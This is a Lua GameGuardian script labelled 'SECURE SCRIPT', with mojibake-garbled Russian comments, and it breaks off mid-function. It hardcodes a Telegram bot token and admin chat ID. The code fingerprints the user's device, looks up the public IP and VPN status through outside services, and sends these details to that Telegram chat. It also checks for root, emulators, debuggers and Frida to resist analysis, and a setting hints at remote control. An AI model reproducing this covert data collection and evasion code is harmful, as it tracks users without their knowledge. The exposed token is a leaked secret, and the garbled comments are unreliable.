-- ============================================================================
-- SECURE SCRIPT v3.2.0 - PRODUCTION READY
-- РџСЂРёРѕСЂРёС‚РµС‚: РќРђР”Р•Р–РќРћРЎРўР¬ > РџСЂРѕРёР·РІРѕРґРёС‚РµР»СЊРЅРѕСЃС‚СЊ
-- РљР°Р¶РґР°СЏ СЃС‚СЂРѕРєР° РїСЂРѕРґСѓРјР°РЅР°, РєР°Р¶РґР°СЏ РїСЂРѕРІРµСЂРєР° РѕР±РѕСЃРЅРѕРІР°РЅР°
-- ============================================================================

local CONFIG = {
    BOT_TOKEN = "8259630875:AAEnTMphfLc-Ywoc8H1nJa0dELRBUv9n6p0",
    ADMIN_CHAT_ID = "7922475024",
    SCRIPT_VERSION = "3.2.0",
    SCRIPT_KEY = "PRO_2024_ULTRA_SECURE_V3",
    CHECK_INTERVAL = 30,
    MAX_VIOLATIONS = 3,
    SESSION_TIMEOUT = 3600,
    TELEGRAM_RETRY_COUNT = 3,
    TELEGRAM_RETRY_DELAY = 2000,
    NETWORK_TIMEOUT = 15000,
    REMOTE_CONTROL_INTERVAL = 5  -- Проверка команд каждые 5 секунд
}

-- ============================================================================
-- UTILITY MODULE - Р‘Р°Р·РѕРІС‹Рµ СѓС‚РёР»РёС‚С‹ СЃ РїРѕР»РЅС‹РјРё РїСЂРѕРІРµСЂРєР°РјРё
-- ============================================================================
local UTIL = (function()
    local util = {}
    
    -- Р‘РµР·РѕРїР°СЃРЅРѕРµ РїСЂРµРѕР±СЂР°Р·РѕРІР°РЅРёРµ РІ СЃС‚СЂРѕРєСѓ СЃ РїРѕР»РЅРѕР№ РІР°Р»РёРґР°С†РёРµР№
    function util.safeToString(value)
        if value == nil then
            return "nil"
        end
        
        if type(value) == "string" then
            return value
        end
        
        local success, result = pcall(tostring, value)
        if success and result ~= nil then
            if type(result) == "string" then
                return result
            end
        end
        
        return "conversion_error"
    end
    
    -- РџСЂРѕРІРµСЂРєР° РІР°Р»РёРґРЅРѕСЃС‚Рё СЃС‚СЂРѕРєРё
    function util.isValidString(str)
        if str == nil then
            return false
        end
        
        if type(str) ~= "string" then
            return false
        end
        
        if str == "" then
            return false
        end
        
        if str == "nil" then
            return false
        end
        
        return true
    end
    
    -- Р‘РµР·РѕРїР°СЃРЅРѕРµ РїРѕР»СѓС‡РµРЅРёРµ Р±Р°Р№С‚Р° РёР· СЃС‚СЂРѕРєРё
    function util.safeStringByte(str, index)
        if not util.isValidString(str) then
            return 0
        end
        
        if type(index) ~= "number" then
            return 0
        end
        
        if index < 1 or index > #str then
            return 0
        end
        
        local success, result = pcall(string.byte, str, index)
        if success and result ~= nil then
            if type(result) == "number" then
                return result
            end
        end
        
        return 0
    end
    
    -- Р‘РµР·РѕРїР°СЃРЅР°СЏ РєРѕРЅРєР°С‚РµРЅР°С†РёСЏ С‚Р°Р±Р»РёС†С‹
    function util.safeTableConcat(tbl, separator)
        if tbl == nil then
            return ""
        end
        
        if type(tbl) ~= "table" then
            return ""
        end
        
        if separator == nil then
            separator = ""
        end
        
        if type(separator) ~= "string" then
            separator = ""
        end
        
        local success, result = pcall(table.concat, tbl, separator)
        if success and result ~= nil then
            if type(result) == "string" then
                return result
            end
        end
        
        return ""
    end
    
    -- Р‘РµР·РѕРїР°СЃРЅС‹Р№ sleep
    function util.safeSleep(ms)
        if type(ms) ~= "number" then
            ms = 100
        end
        
        if ms < 0 then
            ms = 0
        end
        
        if ms > 60000 then
            ms = 60000
        end
        
        local success = pcall(gg.sleep, ms)
        if not success then
            local startTime = os.clock()
            while (os.clock() - startTime) < (ms / 1000) do
            end
        end
    end
    
    return util
end)()

-- ============================================================================
-- CRYPTO MODULE - РљСЂРёРїС‚РѕРіСЂР°С„РёСЏ СЃ РїРѕР»РЅРѕР№ РІР°Р»РёРґР°С†РёРµР№
-- ============================================================================
local CRYPTO = (function()
    local crypto = {}
    
    -- РҐРµС€РёСЂРѕРІР°РЅРёРµ СЃ РїРѕР»РЅС‹РјРё РїСЂРѕРІРµСЂРєР°РјРё
    function crypto.hash(data)
        if data == nil then
            return "0"
        end
        
        local dataStr = ""
        
        if type(data) == "string" then
            dataStr = data
        else
            dataStr = UTIL.safeToString(data)
        end
        
        if not UTIL.isValidString(dataStr) then
            return "0"
        end
        
        local hash = 5381
        local dataLength = #dataStr
        
        if dataLength == 0 then
            return "0"
        end
        
        for i = 1, dataLength do
            local byteValue = UTIL.safeStringByte(dataStr, i)
            if byteValue > 0 then
                local newHash = ((hash * 33) + byteValue) % 2147483647
                if type(newHash) == "number" then
                    hash = newHash
                end
            end
        end
        
        return UTIL.safeToString(hash)
    end
    
    -- XOR С€РёС„СЂРѕРІР°РЅРёРµ СЃ РїРѕР»РЅС‹РјРё РїСЂРѕРІРµСЂРєР°РјРё
    function crypto.xor(data, key)
        if not UTIL.isValidString(data) then
            return ""
        end
        
        if not UTIL.isValidString(key) then
            return ""
        end
        
        local result = {}
        local keyLength = #key
        local dataLength = #data
        
        if keyLength == 0 or dataLength == 0 then
            return ""
        end
        
        for i = 1, dataLength do
            local keyIndex = ((i - 1) % keyLength) + 1
            
            local keyByte = UTIL.safeStringByte(key, keyIndex)
            local dataByte = UTIL.safeStringByte(data, i)
            
            if keyByte > 0 and dataByte > 0 then
                local xorSuccess, xorValue = pcall(bit32.bxor, dataByte, keyByte)
                
                if xorSuccess and xorValue ~= nil then
                    if type(xorValue) == "number" then
                        local charSuccess, charValue = pcall(string.char, xorValue)
                        
                        if charSuccess and charValue ~= nil then
                            result[i] = charValue
                        else
                            result[i] = string.char(0)
                        end
                    else
                        result[i] = string.char(0)
                    end
                else
                    result[i] = string.char(0)
                end
            else
                result[i] = string.char(0)
            end
        end
        
        return UTIL.safeTableConcat(result)
    end
    
    return crypto
end)()

-- ============================================================================
-- DEVICE MODULE - РРЅС„РѕСЂРјР°С†РёСЏ РѕР± СѓСЃС‚СЂРѕР№СЃС‚РІРµ СЃ РїРѕР»РЅС‹РјРё fallback
-- ============================================================================
local DEVICE = (function()
    local device = {}
    
    -- Р‘РµР·РѕРїР°СЃРЅРѕРµ РїРѕР»СѓС‡РµРЅРёРµ Р·РЅР°С‡РµРЅРёСЏ РёР· GG СЃ fallback
    local function safeGetGGValue(value, fallback)
        if fallback == nil then
            fallback = "unknown"
        end
        
        if value == nil then
            return fallback
        end
        
        local valueStr = UTIL.safeToString(value)
        
        if not UTIL.isValidString(valueStr) then
            return fallback
        end
        
        if valueStr == "nil" or valueStr == "conversion_error" then
            return fallback
        end
        
        return valueStr
    end
    
    -- Р“РµРЅРµСЂР°С†РёСЏ HWID СЃ РїРѕР»РЅС‹РјРё РїСЂРѕРІРµСЂРєР°РјРё
    function device.getHWID()
        local parts = {}
        local partIndex = 1
        
        -- РЎРѕР±РёСЂР°РµРј РІСЃРµ РґРѕСЃС‚СѓРїРЅС‹Рµ РґР°РЅРЅС‹Рµ СЃ РїСЂРѕРІРµСЂРєР°РјРё
        local ggValues = {
            gg.BUILD_FINGERPRINT,
            gg.BUILD_MODEL,
            gg.BUILD_MANUFACTURER,
            gg.BUILD_BRAND,
            gg.BUILD_DEVICE,
            gg.BUILD_PRODUCT,
            gg.BUILD_BOARD,
            gg.BUILD_HARDWARE,
            gg.ANDROID_VERSION,
            gg.SDK_INT
        }
        
        for _, value in ipairs(ggValues) do
            local safeValue = safeGetGGValue(value, "")
            parts[partIndex] = safeValue
            partIndex = partIndex + 1
        end
        
        local combined = UTIL.safeTableConcat(parts, "|")
        
        -- Р•СЃР»Рё РЅРµ СѓРґР°Р»РѕСЃСЊ РїРѕР»СѓС‡РёС‚СЊ РґР°РЅРЅС‹Рµ, РёСЃРїРѕР»СЊР·СѓРµРј fallback
        if not UTIL.isValidString(combined) or combined == "||||||||||" then
            local timeSuccess, timeValue = pcall(os.time)
            if timeSuccess and timeValue ~= nil then
                combined = "fallback_hwid_" .. UTIL.safeToString(timeValue)
            else
                combined = "fallback_hwid_default"
            end
        end
        
        local hwid = CRYPTO.hash(combined)
        
        if not UTIL.isValidString(hwid) or hwid == "0" then
            return "emergency_hwid_" .. UTIL.safeToString(os.time())
        end
        
        return hwid
    end
    
    -- РџРѕР»СѓС‡РµРЅРёРµ РїРѕР»РЅРѕР№ РёРЅС„РѕСЂРјР°С†РёРё РѕР± СѓСЃС‚СЂРѕР№СЃС‚РІРµ
    function device.getInfo()
        local info = {
            hwid = "unknown",
            model = "unknown",
            android = "unknown",
            arch = "unknown",
            manufacturer = "unknown",
            fingerprint = "unknown",
            brand = "unknown",
            device = "unknown"
        }
        
        -- HWID СЃ РѕР±СЂР°Р±РѕС‚РєРѕР№ РѕС€РёР±РѕРє
        local hwidSuccess, hwidValue = pcall(device.getHWID)
        if hwidSuccess and hwidValue ~= nil then
            if UTIL.isValidString(hwidValue) then
                info.hwid = hwidValue
            else
                info.hwid = "error_hwid_" .. UTIL.safeToString(os.time())
            end
        else
            info.hwid = "error_hwid_" .. UTIL.safeToString(os.time())
        end
        
        -- РћСЃС‚Р°Р»СЊРЅС‹Рµ РїРѕР»СЏ СЃ РїСЂРѕРІРµСЂРєР°РјРё
        info.model = safeGetGGValue(gg.BUILD_MODEL, "unknown")
        info.manufacturer = safeGetGGValue(gg.BUILD_MANUFACTURER, "unknown")
        info.brand = safeGetGGValue(gg.BUILD_BRAND, "unknown")
        info.device = safeGetGGValue(gg.BUILD_DEVICE, "unknown")
        info.fingerprint = safeGetGGValue(gg.BUILD_FINGERPRINT, "unknown")
        info.arch = safeGetGGValue(gg.ARCH, "unknown")
        
        -- Android РІРµСЂСЃРёСЏ СЃ fallback РЅР° SDK
        if gg.ANDROID_VERSION ~= nil then
            local androidStr = safeGetGGValue(gg.ANDROID_VERSION, "")
            if UTIL.isValidString(androidStr) then
                info.android = androidStr
            elseif gg.SDK_INT ~= nil then
                info.android = "SDK_" .. safeGetGGValue(gg.SDK_INT, "unknown")
            else
                info.android = "unknown"
            end
        elseif gg.SDK_INT ~= nil then
            info.android = "SDK_" .. safeGetGGValue(gg.SDK_INT, "unknown")
        else
            info.android = "unknown"
        end
        
        return info
    end
    
    -- Р”РµС‚РµРєС†РёСЏ СЌРјСѓР»СЏС‚РѕСЂР° СЃ РїРѕР»РЅС‹РјРё РїСЂРѕРІРµСЂРєР°РјРё
    function device.detectEmulator()
        local emulatorSigns = {
            {pattern = "generic", name = "Generic"},
            {pattern = "emulator", name = "Emulator"},
            {pattern = "vbox", name = "VirtualBox"},
            {pattern = "genymotion", name = "Genymotion"},
            {pattern = "nox", name = "Nox"},
            {pattern = "bluestacks", name = "BlueStacks"},
            {pattern = "memu", name = "MEmu"},
            {pattern = "ldplayer", name = "LDPlayer"},
            {pattern = "andy", name = "Andy"},
            {pattern = "droid4x", name = "Droid4X"},
            {pattern = "koplayer", name = "KoPlayer"},
            {pattern = "microvirt", name = "MicroVirt"},
            {pattern = "tiantian", name = "TianTian"},
            {pattern = "ttvm", name = "TTVM"},
            {pattern = "x86", name = "x86"},
            {pattern = "goldfish", name = "Goldfish"},
            {pattern = "ranchu", name = "Ranchu"},
            {pattern = "sdk", name = "SDK"}
        }
        
        -- РЎРѕР±РёСЂР°РµРј build РёРЅС„РѕСЂРјР°С†РёСЋ
        local buildParts = {}
        local buildIndex = 1
        
        local buildValues = {
            gg.BUILD_FINGERPRINT,
            gg.BUILD_MODEL,
            gg.BUILD_MANUFACTURER,
            gg.BUILD_PRODUCT,
            gg.BUILD_DEVICE,
            gg.BUILD_BRAND,
            gg.BUILD_BOARD,
            gg.BUILD_HARDWARE
        }
        
        for _, value in ipairs(buildValues) do
            buildParts[buildIndex] = safeGetGGValue(value, "")
            buildIndex = buildIndex + 1
        end
        
        local buildString = UTIL.safeTableConcat(buildParts, " ")
        
        if not UTIL.isValidString(buildString) then
            return false, nil
        end
        
        -- РџСЂРёРІРѕРґРёРј Рє РЅРёР¶РЅРµРјСѓ СЂРµРіРёСЃС‚СЂСѓ
        local buildLower = ""
        local lowerSuccess, lowerResult = pcall(string.lower, buildString)
        if lowerSuccess and lowerResult ~= nil then
            if type(lowerResult) == "string" then
                buildLower = lowerResult
            else
                return false, nil
            end
        else
            return false, nil
        end
        
        -- РџСЂРѕРІРµСЂСЏРµРј РєР°Р¶РґСѓСЋ СЃРёРіРЅР°С‚СѓСЂСѓ
        for _, sign in ipairs(emulatorSigns) do
            if type(sign) == "table" then
                if sign.pattern ~= nil and UTIL.isValidString(sign.pattern) then
                    local findSuccess, findStart = pcall(string.find, buildLower, sign.pattern)
                    if findSuccess and findStart ~= nil then
                        local signName = "Unknown"
                        if sign.name ~= nil and UTIL.isValidString(sign.name) then
                            signName = sign.name
                        end
                        return true, signName
                    end
                end
            end
        end
        
        -- РџСЂРѕРІРµСЂРєР° test-keys
        if gg.BUILD_FINGERPRINT ~= nil then
            local fpString = safeGetGGValue(gg.BUILD_FINGERPRINT, "")
            if UTIL.isValidString(fpString) then
                local testKeySuccess, testKeyStart = pcall(string.find, fpString, "test%-keys")
                if testKeySuccess and testKeyStart ~= nil then
                    return true, "TestKeys"
                end
            end
        end
        
        return false, nil
    end
    
    -- Р”РµС‚РµРєС†РёСЏ Root СЃ РїСЂРѕРІРµСЂРєР°РјРё
    function device.detectRoot()
        local suPaths = {
            "/system/bin/su",
            "/system/xbin/su",
            "/sbin/su",
            "/system/su",
            "/su/bin/su",
            "/data/local/su",
            "/data/local/bin/su",
            "/data/local/xbin/su"
        }
        
        for _, path in ipairs(suPaths) do
            if UTIL.isValidString(path) then
                local openSuccess, file = pcall(io.open, path, "r")
                if openSuccess and file ~= nil then
                    local closeSuccess = pcall(file.close, file)
                    return true
                end
            end
        end
        
        return false
    end
    
    -- Р”РµС‚РµРєС†РёСЏ Xposed СЃ РїСЂРѕРІРµСЂРєР°РјРё
    function device.detectXposed()
        local xposedFiles = {
            "/system/framework/XposedBridge.jar",
            "/system/lib/libxposed_art.so",
            "/system/lib64/libxposed_art.so"
        }
        
        for _, path in ipairs(xposedFiles) do
            if UTIL.isValidString(path) then
                local openSuccess, file = pcall(io.open, path, "r")
                if openSuccess and file ~= nil then
                    local closeSuccess = pcall(file.close, file)
                    return true
                end
            end
        end
        
        return false
    end
    
    return device
end)()

-- ============================================================================
-- NETWORK MODULE - РЎРµС‚РµРІС‹Рµ С„СѓРЅРєС†РёРё СЃ retry Рё РѕР±СЂР°Р±РѕС‚РєРѕР№ С‚Р°Р№РјР°СѓС‚РѕРІ
-- ============================================================================
local NETWORK = (function()
    local network = {}
    local cache = {
        ip = nil,
        ipTime = 0,
        vpn = nil,
        vpnTime = 0,
        cacheDuration = 300
    }
    
    -- Р‘РµР·РѕРїР°СЃРЅС‹Р№ HTTP Р·Р°РїСЂРѕСЃ СЃ retry
    local function safeRequest(url, options, retryCount)
        if not UTIL.isValidString(url) then
            return nil
        end
        
        if type(options) ~= "table" then
            options = {}
        end
        
        if type(options.timeout) ~= "number" then
            options.timeout = CONFIG.NETWORK_TIMEOUT
        end
        
        if type(retryCount) ~= "number" then
            retryCount = 3
        end
        
        if retryCount < 1 then
            retryCount = 1
        end
        
        if retryCount > 5 then
            retryCount = 5
        end
        
        for attempt = 1, retryCount do
            local requestSuccess, response = pcall(gg.makeRequest, url, options)
            
            if requestSuccess and response ~= nil then
                if type(response) == "table" then
                    if response.content ~= nil then
                        return response
                    end
                end
            end
            
            if attempt < retryCount then
                UTIL.safeSleep(1000 * attempt)
            end
        end
        
        return nil
    end
    
    -- РџРѕР»СѓС‡РµРЅРёРµ IP СЃ retry Рё РєРµС€РёСЂРѕРІР°РЅРёРµРј
    function network.getIP()
        local currentTime = 0
        local timeSuccess, timeValue = pcall(os.time)
        if timeSuccess and timeValue ~= nil then
            if type(timeValue) == "number" then
                currentTime = timeValue
            end
        end
        
        if cache.ip ~= nil and UTIL.isValidString(cache.ip) then
            if (currentTime - cache.ipTime) < cache.cacheDuration then
                return cache.ip
            end
        end
        
        local ipServices = {
            "https://api.ipify.org?format=text",
            "https://icanhazip.com",
            "https://ifconfig.me/ip"
        }
        
        for _, url in ipairs(ipServices) do
            if UTIL.isValidString(url) then
                local response = safeRequest(url, {timeout = 5000}, 2)
                
                if response ~= nil and response.content ~= nil then
                    local content = UTIL.safeToString(response.content)
                    
                    if UTIL.isValidString(content) then
                        local trimSuccess, trimmed = pcall(string.match, content, "^%s*(.-)%s*$")
                        
                        if trimSuccess and trimmed ~= nil then
                            if UTIL.isValidString(trimmed) then
                                local ipPattern = "^%d+%.%d+%.%d+%.%d+$"
                                local matchSuccess, matchResult = pcall(string.match, trimmed, ipPattern)
                                
                                if matchSuccess and matchResult ~= nil then
                                    cache.ip = trimmed
                                    cache.ipTime = currentTime
                                    return trimmed
                                end
                            end
                        end
                    end
                end
            end
        end
        
        return "unknown"
    end
    
    -- РџСЂРѕРІРµСЂРєР° VPN СЃ retry Рё РєРµС€РёСЂРѕРІР°РЅРёРµРј
    function network.checkVPN()
        local currentTime = 0
        local timeSuccess, timeValue = pcall(os.time)
        if timeSuccess and timeValue ~= nil then
            if type(timeValue) == "number" then
                currentTime = timeValue
            end
        end
        
        if cache.vpn ~= nil then
            if (currentTime - cache.vpnTime) < cache.cacheDuration then
                return cache.vpn
            end
        end
        
        local response = safeRequest("https://ipapi.co/json", {timeout = 8000}, 2)
        
        if response ~= nil and response.content ~= nil then
            local content = UTIL.safeToString(response.content)
            
            if UTIL.isValidString(content) then
                local vpnPatterns = {'"vpn":true', '"proxy":true', '"hosting":true'}
                
                for _, pattern in ipairs(vpnPatterns) do
                    if UTIL.isValidString(pattern) then
                        local findSuccess, findResult = pcall(string.find, content, pattern)
                        if findSuccess and findResult ~= nil then
                            cache.vpn = true
                            cache.vpnTime = currentTime
                            return true
                        end
                    end
                end
                
                cache.vpn = false
                cache.vpnTime = currentTime
                return false
            end
        end
        
        return false
    end
    
    -- РћС‡РёСЃС‚РєР° РєРµС€Р°
    function network.clearCache()
        cache.ip = nil
        cache.ipTime = 0
        cache.vpn = nil
        cache.vpnTime = 0
    end
    
    return network
end)()

-- ============================================================================
-- TELEGRAM MODULE - Telegram API СЃ retry Рё РґРµС‚Р°Р»СЊРЅРѕР№ РѕР±СЂР°Р±РѕС‚РєРѕР№ РѕС€РёР±РѕРє
-- ============================================================================
local TELEGRAM = (function()
    local telegram = {}
    local config = {
        token = "",
        chatId = "",
        initialized = false
    }
    
    -- РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ СЃ РїСЂРѕРІРµСЂРєР°РјРё
    function telegram.init(token, chatId)
        if not UTIL.isValidString(token) then
            config.initialized = false
            return false
        end
        
        if not UTIL.isValidString(chatId) then
            config.initialized = false
            return false
        end
        
        config.token = token
        config.chatId = chatId
        config.initialized = true
        return true
    end
    
    -- URL encoding СЃ РїСЂРѕРІРµСЂРєР°РјРё
    local function urlEncode(str)
        if not UTIL.isValidString(str) then
            return ""
        end
        
        local result = str
        
        local replaceSuccess1, result1 = pcall(string.gsub, result, "\n", "%%0A")
        if replaceSuccess1 and result1 ~= nil then
            result = result1
        end
        
        local replaceSuccess2, result2 = pcall(string.gsub, result, " ", "%%20")
        if replaceSuccess2 and result2 ~= nil then
            result = result2
        end
        
        local replaceSuccess3, result3 = pcall(string.gsub, result, ":", "%%3A")
        if replaceSuccess3 and result3 ~= nil then
            result = result3
        end
        
        return result
    end
    
    -- РћС‚РїСЂР°РІРєР° СЃРѕРѕР±С‰РµРЅРёСЏ СЃ retry
    function telegram.send(text, retryCount)
        if not config.initialized then
            return false
        end
        
        if not UTIL.isValidString(text) then
            return false
        end
        
        if type(retryCount) ~= "number" then
            retryCount = CONFIG.TELEGRAM_RETRY_COUNT
        end
        
        if retryCount < 1 then
            retryCount = 1
        end
        
        if retryCount > 5 then
            retryCount = 5
        end
        
        local encodedText = urlEncode(text)
        if not UTIL.isValidString(encodedText) then
            return false
        end
        
        local url = "https://api.telegram.org/bot" .. config.token .. 
                    "/sendMessage?chat_id=" .. config.chatId .. 
                    "&text=" .. encodedText
        
        for attempt = 1, retryCount do
            local requestSuccess, response = pcall(gg.makeRequest, url, {timeout = CONFIG.NETWORK_TIMEOUT})
            
            if requestSuccess and response ~= nil then
                if type(response) == "table" then
                    if response.content ~= nil then
                        local content = UTIL.safeToString(response.content)
                        
                        if UTIL.isValidString(content) then
                            local findSuccess, findResult = pcall(string.find, content, '"ok":true')
                            if findSuccess and findResult ~= nil then
                                return true
                            end
                        end
                    end
                end
            end
            
            if attempt < retryCount then
                UTIL.safeSleep(CONFIG.TELEGRAM_RETRY_DELAY * attempt)
            end
        end
        
        return false
    end
    
    -- РћС‚РїСЂР°РІРєР° alert
    function telegram.alert(alertType, details)
        if not UTIL.isValidString(alertType) then
            alertType = "UNKNOWN"
        end
        
        if not UTIL.isValidString(details) then
            details = "No details"
        end
        
        local timeStr = "unknown"
        local dateSuccess, dateResult = pcall(os.date, "%Y-%m-%d %H:%M:%S")
        if dateSuccess and dateResult ~= nil then
            timeStr = UTIL.safeToString(dateResult)
        end
        
        local message = "ALERT\n\nType: " .. alertType .. 
                       "\nDetails: " .. details .. 
                       "\nTime: " .. timeStr
        
        return telegram.send(message, CONFIG.TELEGRAM_RETRY_COUNT)
    end
    
    -- РћС‚РїСЂР°РІРєР° session start
    function telegram.sessionStart(data)
        if type(data) ~= "table" then
            return false
        end
        
        local version = UTIL.safeToString(data.version or "unknown")
        local deviceId = UTIL.safeToString(data.deviceId or "unknown")
        local hwid = UTIL.safeToString(data.hwid or "unknown")
        local model = UTIL.safeToString(data.model or "unknown")
        local manufacturer = UTIL.safeToString(data.manufacturer or "unknown")
        local brand = UTIL.safeToString(data.brand or "unknown")
        local device = UTIL.safeToString(data.device or "unknown")
        local android = UTIL.safeToString(data.android or "unknown")
        local arch = UTIL.safeToString(data.arch or "unknown")
        local fingerprint = UTIL.safeToString(data.fingerprint or "unknown")
        local sessionId = UTIL.safeToString(data.sessionId or "unknown")
        
        local emuStatus = "NO"
        if data.emulator == true then
            local emuType = UTIL.safeToString(data.emuType or "Unknown")
            emuStatus = "YES - " .. emuType
        end
        
        local rootStatus = "NO"
        if data.root == true then
            rootStatus = "YES"
        end
        
        local vpnStatus = "NO"
        if data.vpn == true then
            vpnStatus = "YES"
        end
        
        local xposedStatus = "NO"
        if data.xposed == true then
            xposedStatus = "YES"
        end
        
        local timeStr = "unknown"
        local dateSuccess, dateResult = pcall(os.date, "%Y-%m-%d %H:%M:%S")
        if dateSuccess and dateResult ~= nil then
            timeStr = UTIL.safeToString(dateResult)
        end
        
        local fpShort = fingerprint
        if #fingerprint > 30 then
            local subSuccess, subResult = pcall(string.sub, fingerprint, 1, 30)
            if subSuccess and subResult ~= nil then
                fpShort = subResult
            end
        end
        
        local hwidShort = hwid
        if #hwid > 12 then
            local subSuccess, subResult = pcall(string.sub, hwid, 1, 12)
            if subSuccess and subResult ~= nil then
                hwidShort = subResult
            end
        end
        
        local sessionShort = sessionId
        if #sessionId > 12 then
            local subSuccess, subResult = pcall(string.sub, sessionId, 1, 12)
            if subSuccess and subResult ~= nil then
                sessionShort = subResult
            end
        end
        
        local message = "SESSION START\n\n" ..
                       "Ver: " .. version .. "\n" ..
                       "ID: " .. deviceId .. "\n" ..
                       "HWID: " .. hwidShort .. "\n\n" ..
                       "Model: " .. model .. "\n" ..
                       "Manufacturer: " .. manufacturer .. "\n" ..
                       "Brand: " .. brand .. "\n" ..
                       "Device: " .. device .. "\n" ..
                       "Android: " .. android .. "\n" ..
                       "Arch: " .. arch .. "\n" ..
                       "Fingerprint: " .. fpShort .. "\n\n" ..
                       "Emulator: " .. emuStatus .. "\n" ..
                       "Root: " .. rootStatus .. "\n" ..
                       "VPN: " .. vpnStatus .. "\n" ..
                       "Xposed: " .. xposedStatus .. "\n\n" ..
                       "Session: " .. sessionShort .. "\n" ..
                       "Time: " .. timeStr
        
        return telegram.send(message, CONFIG.TELEGRAM_RETRY_COUNT)
    end
    
    -- РћС‚РїСЂР°РІРєР° session end
    function telegram.sessionEnd(data)
        if type(data) ~= "table" then
            return false
        end
        
        local sessionId = UTIL.safeToString(data.sessionId or "unknown")
        local uptime = 0
        if type(data.uptime) == "number" then
            uptime = data.uptime
        end
        local checks = 0
        if type(data.checks) == "number" then
            checks = data.checks
        end
        local violations = 0
        if type(data.violations) == "number" then
            violations = data.violations
        end
        
        local hours = math.floor(uptime / 3600)
        local minutes = math.floor((uptime % 3600) / 60)
        local seconds = uptime % 60
        
        local timeStr = "unknown"
        local dateSuccess, dateResult = pcall(os.date, "%Y-%m-%d %H:%M:%S")
        if dateSuccess and dateResult ~= nil then
            timeStr = UTIL.safeToString(dateResult)
        end
        
        local sessionShort = sessionId
        if #sessionId > 12 then
            local subSuccess, subResult = pcall(string.sub, sessionId, 1, 12)
            if subSuccess and subResult ~= nil then
                sessionShort = subResult
            end
        end
        
        local message = "SESSION END\n\n" ..
                       "Session: " .. sessionShort .. "\n" ..
                       "Uptime: " .. hours .. "h " .. minutes .. "m " .. seconds .. "s\n" ..
                       "Checks: " .. checks .. "\n" ..
                       "Violations: " .. violations .. "\n" ..
                       "Time: " .. timeStr
        
        return telegram.send(message, CONFIG.TELEGRAM_RETRY_COUNT)
    end
    
    return telegram
end)()

-- ============================================================================
-- ANTI_DEBUG MODULE - РђРЅС‚Рё-РѕС‚Р»Р°РґРєР° СЃ РїРѕР»РЅС‹РјРё РїСЂРѕРІРµСЂРєР°РјРё
-- ============================================================================
local ANTI_DEBUG = (function()
    local antiDebug = {}
    local state = {
        count = 0,
        baseline = 0
    }
    
    -- Timing check СЃ РѕР±СЂР°Р±РѕС‚РєРѕР№ РѕС€РёР±РѕРє
    function antiDebug.timingCheck()
        local startSuccess, startTime = pcall(os.clock)
        if not startSuccess or startTime == nil then
            return true
        end
        
        if type(startTime) ~= "number" then
            return true
        end
        
        local dummy = 0
        for i = 1, 1000 do
            dummy = dummy + i
        end
        
        local endSuccess, endTime = pcall(os.clock)
        if not endSuccess or endTime == nil then
            return true
        end
        
        if type(endTime) ~= "number" then
            return true
        end
        
        local elapsed = endTime - startTime
        
        if state.baseline == 0 then
            state.baseline = elapsed
            return true
        end
        
        if elapsed <= (state.baseline * 3) then
            return true
        end
        
        return false
    end
    
    -- Tracer check СЃ РѕР±СЂР°Р±РѕС‚РєРѕР№ РѕС€РёР±РѕРє
    function antiDebug.tracerCheck()
        local path = "/proc/self/status"
        
        if not UTIL.isValidString(path) then
            return true
        end
        
        local openSuccess, file = pcall(io.open, path, "r")
        if not openSuccess or file == nil then
            return true
        end
        
        local readSuccess, content = pcall(file.read, file, "*a")
        
        local closeSuccess = pcall(file.close, file)
        
        if not readSuccess or content == nil then
            return true
        end
        
        if type(content) ~= "string" then
            return true
        end
        
        local matchSuccess, pid = pcall(string.match, content, "TracerPid:%s+(%d+)")
        if not matchSuccess or pid == nil then
            return true
        end
        
        local pidNum = tonumber(pid)
        if pidNum == nil then
            return true
        end
        
        if pidNum > 0 then
            return false
        end
        
        return true
    end
    
    -- Frida check СЃ РѕР±СЂР°Р±РѕС‚РєРѕР№ РѕС€РёР±РѕРє
    function antiDebug.fridaCheck()
        local ports = {23946, 27042, 27043}
        local tcpPath = "/proc/net/tcp"
        
        if UTIL.isValidString(tcpPath) then
            local openSuccess, file = pcall(io.open, tcpPath, "r")
            if openSuccess and file ~= nil then
                local readSuccess, content = pcall(file.read, file, "*a")
                local closeSuccess = pcall(file.close, file)
                
                if readSuccess and content ~= nil then
                    if type(content) == "string" then
                        for _, port in ipairs(ports) do
                            if type(port) == "number" then
                                local formatSuccess, hexPort = pcall(string.format, "%04X", port)
                                if formatSuccess and hexPort ~= nil then
                                    if UTIL.isValidString(hexPort) then
                                        local findSuccess, findResult = pcall(string.find, content, hexPort)
                                        if findSuccess and findResult ~= nil then
                                            return false
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
        
        local mapsPath = "/proc/self/maps"
        if UTIL.isValidString(mapsPath) then
            local openSuccess, file = pcall(io.open, mapsPath, "r")
            if openSuccess and file ~= nil then
                local readSuccess, content = pcall(file.read, file, "*a")
                local closeSuccess = pcall(file.close, file)
                
                if readSuccess and content ~= nil then
                    if type(content) == "string" then
                        local findSuccess, findResult = pcall(string.find, content, "frida")
                        if findSuccess and findResult ~= nil then
                            return false
                        end
                    end
                end
            end
        end
        
        return true
    end
    
    -- РћР±С‰Р°СЏ РїСЂРѕРІРµСЂРєР°
    function antiDebug.check()
        local timingOk = true
        local timingSuccess, timingResult = pcall(antiDebug.timingCheck)
        if timingSuccess and timingResult ~= nil then
            if type(timingResult) == "boolean" then
                timingOk = timingResult
            end
        end
        
        local tracerOk = true
        local tracerSuccess, tracerResult = pcall(antiDebug.tracerCheck)
        if tracerSuccess and tracerResult ~= nil then
            if type(tracerResult) == "boolean" then
                tracerOk = tracerResult
            end
        end
        
        local fridaOk = true
        local fridaSuccess, fridaResult = pcall(antiDebug.fridaCheck)
        if fridaSuccess and fridaResult ~= nil then
            if type(fridaResult) == "boolean" then
                fridaOk = fridaResult
            end
        end
        
        return timingOk and tracerOk and fridaOk
    end
    
    return antiDebug
end)()

-- ============================================================================
-- INTEGRITY MODULE - РџСЂРѕРІРµСЂРєР° С†РµР»РѕСЃС‚РЅРѕСЃС‚Рё СЃ РІРѕСЃСЃС‚Р°РЅРѕРІР»РµРЅРёРµРј
-- ============================================================================
local INTEGRITY = (function()
    local integrity = {}
    local state = {
        hash = "",
        memory = {},
        initialized = false
    }
    
    -- РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ СЃ РїСЂРѕРІРµСЂРєР°РјРё
    function integrity.init(key, hwid)
        if not UTIL.isValidString(key) then
            state.initialized = false
            return false
        end
        
        if not UTIL.isValidString(hwid) then
            state.initialized = false
            return false
        end
        
